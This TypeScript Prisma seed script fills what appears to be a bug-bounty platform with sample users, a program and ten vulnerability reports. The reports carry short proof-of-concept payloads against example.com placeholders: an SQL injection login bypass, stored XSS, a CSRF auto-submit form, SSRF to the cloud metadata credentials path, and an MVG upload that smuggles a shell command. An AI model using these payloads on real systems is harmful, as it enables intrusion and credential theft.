import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

async function main() {
  console.log("🌱 Cleaning existing database records...");
  await prisma.comment.deleteMany({});
  await prisma.report.deleteMany({});
  await prisma.program.deleteMany({});
  await prisma.user.deleteMany({});
  await prisma.tool.deleteMany({});
  await prisma.methodologyStep.deleteMany({});

  console.log("👤 Creating seed users...");
  const researcher = await prisma.user.create({
    data: {
      name: "Alex Vance",
      email: "alex@security.io",
      role: "RESEARCHER",
      avatar: "👨‍💻",
      bountyEarned: 4700,
      reputation: 920,
    },
  });

  const triager = await prisma.user.create({
    data: {
      name: "Marcus Sterling",
      email: "marcus@cyberscope.io",
      role: "TRIAGER",
      avatar: "🛡️",
      reputation: 1500,
    },
  });

  const admin = await prisma.user.create({
    data: {
      name: "Sarah Connor",
      email: "sarah@cyberscope.io",
      role: "ADMIN",
      avatar: "⚡",
      reputation: 2800,
    },
  });

  console.log("🏢 Creating seed bounty programs...");
  const program = await prisma.program.create({
    data: {
      name: "Acme Cloud Infrastructure",
      handle: "acme-cloud",
      scope: "*.example.com, api.example.com, auth.example.com, admin.example.com",
      rules: "Follow OWASP ASVS standard. No DoS or automated traffic flooding allowed. Safe harbor guaranteed.",
      minBounty: 150,
      maxBounty: 5000,
    },
  });

  console.log("📋 Seeding vulnerability reports...");
  const reports = [
    {
      referenceId: "BB-001",
      title: "SQL Injection in Login API",
      asset: "api.example.com/auth/login",
      vulnerabilityType: "SQL Injection",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      cvssScore: 9.8,
      severity: "CRITICAL",
      status: "RESOLVED",
      poc: "POST /auth/login HTTP/1.1\nHost: api.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1'--&password=test",
      stepsToReproduce: "1. Intercept POST to /auth/login\n2. Inject payload username=admin' OR '1'='1'--\n3. Observe 200 OK with Administrator JWT session token.",
      description: "Concatenated dynamic SQL statement in authentication backend permitted complete authentication bypass without valid password credentials.",
      bountyAmount: 2500,
    },
    {
      referenceId: "BB-002",
      title: "Broken Access Control on Admin Panel",
      asset: "admin.example.com",
      vulnerabilityType: "Broken Access Control",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      cvssScore: 9.1,
      severity: "CRITICAL",
      status: "IN_PROGRESS",
      poc: "GET /admin/tenants HTTP/1.1\nHost: admin.example.com\nX-Original-URL: /admin/dashboard",
      stepsToReproduce: "1. Navigate to admin.example.com\n2. Strip session cookies and supply header X-Original-URL: /admin/dashboard\n3. Backend reverse proxy forwards request bypassing auth middleware.",
      description: "Administrative console failed to verify user role claims when requests were routed through custom reverse-proxy headers.",
      bountyAmount: 2000,
    },
    {
      referenceId: "BB-003",
      title: "Stored XSS in Comment Field",
      asset: "app.example.com/comments",
      vulnerabilityType: "Cross-Site Scripting",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
      cvssScore: 8.3,
      severity: "HIGH",
      status: "SUBMITTED",
      poc: 'POST /comments HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{"article_id":"4892","comment_text":"<img src=x onerror=alert(document.domain)>"}',
      stepsToReproduce: "1. Submit a comment containing <img src=x onerror=alert(document.domain)>\n2. View the comment thread as another logged-in user\n3. Script executes in the context of the viewing user.",
      description: "Comment submission endpoint persisted raw HTML elements without context-aware entity encoding, allowing arbitrary JavaScript execution in reader browsers.",
      bountyAmount: null,
    },
    {
      referenceId: "BB-004",
      title: "IDOR in User Profile API",
      asset: "api.example.com/users/{id}",
      vulnerabilityType: "IDOR",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
      cvssScore: 8.1,
      severity: "HIGH",
      status: "TRIAGED",
      poc: "GET /api/users/1024 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <USER_1023_TOKEN>",
      stepsToReproduce: "1. Log in as user 1023\n2. Send GET request to /api/users/1024\n3. Endpoint returns full PII profile data of user 1024 without tenancy checks.",
      description: "Direct object references utilizing predictable sequential integers allowed authenticated users to harvest records of all other registered accounts.",
      bountyAmount: 1200,
    },
    {
      referenceId: "BB-005",
      title: "Sensitive Data Exposure via Backup File",
      asset: "files.example.com/backup.zip",
      vulnerabilityType: "Sensitive Data Exposure",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      cvssScore: 7.5,
      severity: "HIGH",
      status: "RESOLVED",
      poc: "curl -I https://files.example.com/backup.zip\nHTTP/1.1 200 OK\nContent-Type: application/zip\nContent-Length: 48920194",
      stepsToReproduce: "1. Probe common archive extensions at root\n2. Download backup.zip\n3. Archive contains database credentials and secret JWT signing keys.",
      description: "Publicly accessible archive directory exposed server environment configurations, production database dumps, and active signing keys.",
      bountyAmount: 1000,
    },
    {
      referenceId: "BB-006",
      title: "Missing CSRF Protection on Password Change",
      asset: "app.example.com/settings",
      vulnerabilityType: "CSRF",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      cvssScore: 5.4,
      severity: "MEDIUM",
      status: "SUBMITTED",
      poc: '<form action="https://app.example.com/settings/password" method="POST">\n  <input type="hidden" name="new_password" value="AttackerP@ss123" />\n</form><script>document.forms[0].submit()</script>',
      stepsToReproduce: "1. Victim clicks attacker link while authenticated\n2. Form automatically submits password update without CSRF anti-tamper token\n3. Victim account password updated.",
      description: "State-changing password modification endpoint omitted anti-CSRF synchronizer tokens, enabling cross-origin automated requests.",
      bountyAmount: null,
    },
    {
      referenceId: "BB-007",
      title: "Open Redirect in Redirect Parameter",
      asset: "auth.example.com/redirect",
      vulnerabilityType: "Open Redirect",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
      cvssScore: 4.7,
      severity: "MEDIUM",
      status: "TRIAGED",
      poc: "https://auth.example.com/redirect?next=https://attacker-domain.com/login",
      stepsToReproduce: "1. Visit auth URL with external destination in ?next= parameter\n2. Authenticate or follow redirect\n3. Browser navigates to external domain with no intermediate warning.",
      description: "Unvalidated redirection destination permitted attackers to build phishing URLs under the trusted example.com domain name.",
      bountyAmount: 250,
    },
    {
      referenceId: "BB-008",
      title: "Outdated TLS Configuration",
      asset: "*.example.com",
      vulnerabilityType: "Security Misconfiguration",
      cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      cvssScore: 5.9,
      severity: "MEDIUM",
      status: "IN_PROGRESS",
      poc: "sslscan --tls10 --tls11 *.example.com",
      stepsToReproduce: "1. Execute sslscan against perimeter endpoints\n2. Observe active negotiation for TLS 1.0/1.1 and deprecated 3DES/CBC ciphers.",
      description: "Perimeter load balancers supported obsolete SSL/TLS protocols and weak ciphers vulnerable to cryptographic downgrade exploits.",
      bountyAmount: 300,
    },
    {
      referenceId: "BB-009",
      title: "Server-Side Request Forgery in Webhook Dispatcher",
      asset: "api.example.com/v1/webhooks",
      vulnerabilityType: "SSRF",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
      cvssScore: 8.6,
      severity: "HIGH",
      status: "ACCEPTED",
      poc: 'POST /v1/webhooks HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
      stepsToReproduce: "1. Register a webhook pointing to the cloud metadata IP 169.254.169.254\n2. Trigger a test notification\n3. Webhook delivery service returns IAM role security credentials.",
      description: "Webhook callback feature lacked IP address restriction, allowing internal network requests to AWS instance metadata service.",
      bountyAmount: 1800,
    },
    {
      referenceId: "BB-010",
      title: "Remote Code Execution via Image File Upload",
      asset: "app.example.com/avatar",
      vulnerabilityType: "Remote Code Execution",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
      cvssScore: 9.9,
      severity: "CRITICAL",
      status: "RESOLVED",
      poc: 'POST /avatar HTTP/1.1\nHost: app.example.com\nContent-Type: multipart/form-data\n\nFilename: "poc.mvg"\npush graphic-context\nviewbox 0 0 640 480\nfill \'url(https://example.com"|id)\'\npop graphic-context',
      stepsToReproduce: "1. Upload crafted MVG image file as profile avatar\n2. Underlying image processing delegate executes embedded shell instruction\n3. Command response returned in error diagnostic log.",
      description: "Vulnerable image processing backend library invoked external system utilities without sanitizing filename delegates, permitting arbitrary remote code execution.",
      bountyAmount: 4000,
    },
  ];

  for (const r of reports) {
    const created = await prisma.report.create({
      data: {
        ...r,
        researcherId: researcher.id,
        programId: program.id,
      },
    });

    // Add initial triager comment
    if (r.status === "RESOLVED") {
      await prisma.comment.create({
        data: {
          reportId: created.id,
          authorId: triager.id,
          body: `Verified and confirmed resolved in build 2026.11. Bounty of $${r.bountyAmount} awarded to researcher. Excellent submission!`,
          isInternal: false,
        },
      });
    } else if (r.status === "IN_PROGRESS" || r.status === "ACCEPTED") {
      await prisma.comment.create({
        data: {
          reportId: created.id,
          authorId: triager.id,
          body: "Triaged and validated against staging environment. Engineering ticket assigned for remediation.",
          isInternal: false,
        },
      });
      await prisma.comment.create({
        data: {
          reportId: created.id,
          authorId: admin.id,
          body: "Internal note: SLA countdown started. High priority patch scheduled.",
          isInternal: true,
        },
      });
    }
  }

  console.log("🛠️ Seeding security tools...");
  const tools = [
    { name: "Nmap", category: "Recon / Port Scan", description: "Network exploration tool and security scanner for host discovery and port scanning.", url: "https://nmap.org" },
    { name: "Burp Suite Pro", category: "Web Proxy", description: "Leading web vulnerability scanner and intercepting proxy used to manipulate HTTP traffic.", url: "https://portswigger.net" },
    { name: "OWASP ZAP", category: "DAST Scanner", description: "Open-source dynamic application security testing scanner for detecting web vulnerabilities.", url: "https://zaproxy.org" },
    { name: "Metasploit", category: "Exploitation", description: "Penetration testing framework providing known exploit modules and payloads.", url: "https://metasploit.com" },
    { name: "SQLmap", category: "DB Injection", description: "Automated tool for detecting and safely exploiting SQL injection flaws.", url: "https://sqlmap.org" },
    { name: "Nikto", category: "Web Server Audit", description: "Web server scanner testing for dangerous files and outdated server software.", url: "https://cirt.net/Nikto2" },
    { name: "Wireshark", category: "Packet Sniffer", description: "Network protocol analyzer capturing packet traffic in real time.", url: "https://wireshark.org" },
    { name: "Acunetix", category: "Automated Audit", description: "Automated web application security scanner for enterprise vulnerabilities.", url: "https://acunetix.com" },
    { name: "Nessus", category: "Infra Scanner", description: "Vulnerability assessment scanner for OS and cloud misconfigurations.", url: "https://tenable.com" },
    { name: "Sublist3r", category: "OSINT Recon", description: "Python tool for subdomain enumeration using multiple OSINT sources.", url: "https://github.com/aboul3la/Sublist3r" },
    { name: "Ghidra", category: "Reverse Eng", description: "Software reverse-engineering framework developed by the NSA.", url: "https://ghidra-sre.org" },
    { name: "Hydra", category: "Auth Auditing", description: "Parallelized network logon cracker supporting numerous protocols.", url: "https://github.com/vanhauser-thc/thc-hydra" },
  ];

  for (const t of tools) {
    await prisma.tool.create({ data: t });
  }

  console.log("📐 Seeding methodology steps...");
  const steps = [
    { order: 1, title: "Reconnaissance & OSINT", description: "Passive and active information gathering across target organization, DNS, and subdomains.", tools: "Sublist3r, Amass, whois, DNS Recon" },
    { order: 2, title: "Scanning & Enumeration", description: "Full TCP/UDP port scanning, service version fingerprinting, and API discovery.", tools: "Nmap, Nikto, Masscan, SSLScan" },
    { order: 3, title: "Vulnerability Identification", description: "Automated security sweeps combined with deep manual fuzzing and business logic analysis.", tools: "Burp Suite, OWASP ZAP, ffuf, Postman" },
    { order: 4, title: "Exploitation & Validation", description: "Safe, deterministic exploitation verifying impact without service interruption.", tools: "SQLmap, Metasploit, Custom Python PoCs" },
    { order: 5, title: "Post-Exploitation & Blast Radius", description: "Quantifying lateral movement potential, PII exposure risk, and compliance liability.", tools: "Blast Radius Mapping, PII Exposure Audit" },
    { order: 6, title: "Reporting & Remediation", description: "Drafting reproducible CVSS reports with actionable engineering patch instructions.", tools: "CVSS v3.1, OWASP ASVS, Patch Verification" },
  ];

  for (const s of steps) {
    await prisma.methodologyStep.create({ data: s });
  }

  console.log("✅ Seed completed successfully!");
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
